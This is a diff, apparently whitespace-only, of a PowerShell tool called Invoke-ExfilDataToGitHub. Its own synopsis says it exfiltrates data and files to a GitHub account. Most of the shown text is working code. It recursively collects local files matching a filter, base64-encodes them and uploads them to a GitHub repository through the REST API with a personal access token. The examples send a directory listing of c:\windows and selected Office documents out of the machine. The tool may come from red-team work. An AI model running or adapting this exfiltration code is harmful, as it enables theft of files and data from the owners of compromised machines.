@@ -3,9 +3,9 @@ function Invoke-ExfilDataToGitHub
 
 <#
 
-.SYNOPSIS 
-Use this script to exfiltrate data and files to a GitHub account. 
-Using GitHub v3 REST API tutorial here 
+.SYNOPSIS
+Use this script to exfiltrate data and files to a GitHub account.
+Using GitHub v3 REST API tutorial here
 https://channel9.msdn.com/Blogs/trevor-powershell/Automating-the-GitHub-REST-API-Using-PowerShell
 
 
@@ -30,7 +30,7 @@ Local file path of files to upload
 GitHub filename eg. testfile.txt
 
 .PARAMETER Filter
-Local file filter eg. '*.*' to get all files (default), '*.pdf' for all pdfs, or 'file.txt, file2.docx' to get a comma-delimited list of files from that dirctory. 
+Local file filter eg. '*.*' to get all files (default), '*.pdf' for all pdfs, or 'file.txt, file2.docx' to get a comma-delimited list of files from that dirctory.
 
 .PARAMETER Data
 Data to write to file
@@ -43,7 +43,7 @@ Recursively get files from subdirectories of given local filepath
 .EXAMPLE
 # This example exfiltrates data to a file - keys do not work
 
-Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZ==" 
+Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZ=="
                                                 -GHFilePath "testfolder/" -GHFileName "testfile3" -Data (dir c:\windows | Out-String )
 .EXAMPLE
 # This example exfiltrates files from a given directory and filter
@@ -53,8 +53,8 @@ Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3Mz
 
 .EXAMPLE
 # This examples exfiltrates specific files from a given directory
-Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZ==" 
-    -GHFilePath "testfolder" -LocalfilePath "C:\temp" -Filter "play.pptx, test.pub, blank.docx" -Recurse 
+Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZ=="
+    -GHFilePath "testfolder" -LocalfilePath "C:\temp" -Filter "play.pptx, test.pub, blank.docx" -Recurse
 
 #>
 
@@ -109,7 +109,7 @@ Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3Mz
 
     # Convert this to Base64
     $Base64Token = [System.Convert]::ToBase64String([char[]]$Token)
-    
+
     $Headers = @{
         Authorization =  'Basic {0}' -f $Base64Token;
     };
@@ -137,24 +137,24 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilDataToFile")
         $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Get -ErrorAction SilentlyContinue
          # If we get here that means we were able to get the contents so get hold of the sha
         $sha = $content.sha
-        
+
     }
-    Catch {        
+    Catch {
         $ErrorMessage = "Trying to get file contents: " + $_.Exception.Message;
-        Write-Error $ErrorMessage; 
+        Write-Error $ErrorMessage;
     }
 
-   
+
 
     # Delete the file if it already exists
     if ($sha -ne $null){
-    
+
 
         $Body = @{
             path = $GHFileName;
             message = "deleted file";
             sha = $sha;
-    
+
         } | ConvertTo-Json;
 
         try {
@@ -162,29 +162,29 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilDataToFile")
         }
         catch{
             $ErrorMessage = "Trying to delete file: " + $_.Exception.Message;
-            Write-Error $ErrorMessage; 
+            Write-Error $ErrorMessage;
         }
-    } 
+    }
 
     # Here we are adding the file
     $Body = @{
         path = $GHFileName;
         content = [System.Convert]::ToBase64String([char[]]$Data);
         encoding = 'base64';
-        message = "Commit at: " + (Get-Date); 
+        message = "Commit at: " + (Get-Date);
         } | ConvertTo-Json;
-       
-        try{            
+
+        try{
             $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Put -ErrorAction SilentlyContinue
         }
         catch{
             $ErrorMessage = "Trying to create file: " + $_.Exception.Message;
             Write-Error $ErrorMessage;
-           
-        }    
+
+        }
 
 
-    
+
 }
 
 
@@ -206,15 +206,15 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
     $Files = @()
 
     $Filters = $Filter.Split(',')
-    
-    ForEach ($fil in $Filters) { 
 
-        # Check if files should be recursively retrieved 
+    ForEach ($fil in $Filters) {
+
+        # Check if files should be recursively retrieved
         if ($Recurse -eq $True){
             Get-ChildItem -Recurse ($LocalFilePath + $fil.Trim()) | ForEach-Object { $Files += $_ }
         }
         elseif ($Recurse -eq $False) {
-            Get-ChildItem ($LocalFilePath + $fil.Trim()) | ForEach-Object { $Files += $_ } 
+            Get-ChildItem ($LocalFilePath + $fil.Trim()) | ForEach-Object { $Files += $_ }
         }
     }
 
@@ -222,11 +222,11 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
     ForEach ($file in $Files){
 
         Try {
-            
+
             # Construct the API URL
             $GHAPI = "https://api.github.com/repos/" + $GHUser + "/" + $GHRepo + "/contents/" + $GHFilePath + $file.Name
 
-            
+
             # Check to see if the file already exists
             $Body = @{
                 path = $GHFilePath + $file.Name;
@@ -238,18 +238,18 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
                 # If we get here that means we were able to get the contents so get hold of the sha
                 $sha = $content.sha
             }
-            Catch {      
+            Catch {
                 $ErrorMessage = "Trying to get file contents: " + $_.Exception.Message;
                 Write-Error $ErrorMessage;
             }
 
             # Delete the file if it already exists
             if ($sha -ne $null){
-    
+
                 $Body = @{
                     path = $file.Name;
                     message = "deleted file";
-                    sha = $sha;    
+                    sha = $sha;
                 } | ConvertTo-Json;
 
                 try {
@@ -259,34 +259,34 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
                     $ErrorMessage = "Trying to delete file: " + $_.Exception.Message;
                     Write-Error $ErrorMessage;
                 }
-            } 
+            }
 
             # Upload the file
             # Get the file as a byte array
             $FileBytes = Get-Content -Path $file.FullName -Encoding Byte
             # Base 64 encode the byte array
             $Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes)
-            
+
             # Set the body context for GitHub
             $Body = @{
                 path = $file.Name
-                content = $Base64EncodedFileBytes;                
+                content = $Base64EncodedFileBytes;
                 encoding = 'base64'
                 message = "Commit at: " + (Get-Date);
             } | ConvertTo-Json
-            
+
             $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Put -ErrorAction SilentlyContinue | Write-Output
-            
+
 
         }
         Catch {
             $ErrorMessage = "Trying to upload file " + $file.FullName + " :" + $_.Exception.Message;
             Write-Error $ErrorMessage
-            
+
         }
 
     }
-   
+
 }
 
 #endregion
